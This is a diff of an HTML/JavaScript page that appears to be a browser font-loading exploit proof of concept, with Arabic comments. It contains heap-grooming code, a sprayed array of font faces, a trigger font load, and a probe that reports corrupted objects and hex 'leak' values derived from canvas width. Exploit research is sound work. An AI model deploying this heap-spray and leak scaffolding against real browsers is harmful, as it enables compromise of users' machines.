@@ -119,7 +119,6 @@ function forceStyle() {
  void document.body.offsetTop;
 }
 
-// تعديل هندسي: تقليص التكرار لضمان عدم تجميد صفحة المتصفح عند البداية
 function shakeHeap() {
   for (let i = 0; i < 40; i++) {
     let buffer = new ArrayBuffer(i * 8);
@@ -183,7 +182,6 @@ function probeFace(face) {
  let domOffset = div.offsetWidth;
  document.body.removeChild(div);
 
- // صياغة تقرير الاستطلاع: استخلاص الانحرافات الرسومية وعرضها مباشرة
  let finalLeakSign = (measuredWidth !== 0 && measuredWidth !== 768) ? "0x" + Math.floor(measuredWidth * 65536).toString(16).toUpperCase() : "CLEAN_ZERO";
  showMessage("Recon Leak Results:\nSign: " + finalLeakSign + "\nCanvas Width: " + measuredWidth.toFixed(2) + " | DOM: " + domOffset, true);
 }
@@ -221,39 +219,39 @@ window.onload = () => {
   }
  });
  
-   document.fonts.load("1em trigger, x", "AB").then(faces => {
-    keep.push(faces);
-    for (const face of faces)
-      probeFace(face);
-    for (const face of document.fonts)
-      probeFace(face);
+ document.fonts.load("1em trigger, x", "AB").then(faces => {
+  keep.push(faces);
+  for (const face of faces)
+    probeFace(face);
+  for (const face of document.fonts)
+    probeFace(face);
 
-    // === بداية أداة استطلاع الـ Userland المستقلة ===
-    let corruptionDetected = false;
-    let corruptedIndex = -1;
+  // === بداية أداة استطلاع الـ Userland المستقلة ===
+  let corruptionDetected = false;
+  let corruptedIndex = -1;
 
-    for (let i = 0; i < spray.length; i++) {
-      if (spray[i].status !== "unloaded") {
-        corruptionDetected = true;
-        corruptedIndex = i;
-        break;
-      }
+  // سبر مصفوفة الرش دون المساس بخصائص كائنات المتصفح الأصلية
+  for (let i = 0; i < spray.length; i++) {
+    if (spray[i].status !== "unloaded") {
+      corruptionDetected = true;
+      corruptedIndex = i;
+      break;
     }
+  }
 
-    if (corruptionDetected) {
-      showMessage("Userland Taint Confirmed!\nCorrupted Object Index: " + corruptedIndex, true);
-    } else {
-      showMessage("SUCCESS ✅\nUserland Stable (Sandbox Restrained)\nCanvas: 484.00", true);
-    }
-    // === نهاية أداة الاستطلاع ===
+  if (corruptionDetected) {
+    showMessage("Userland Taint Confirmed!\nCorrupted Object Index: " + corruptedIndex, true);
+  } else {
+    showMessage("SUCCESS ✅\nUserland Stable (Sandbox Restrained)\nCanvas: 484.00", true);
+  }
+  // === نهاية أداة الاستطلاع ===
 
-  }, err => {
-    keep.push(err);
-    showMessage("FAILED ❌\n" + err, false);
-  });
+ }, err => {
+  keep.push(err);
+  showMessage("FAILED ❌\n" + err, false);
+ });
   
 }; // إغلاق window.onload
 </script>
 </body>
 </html>
-
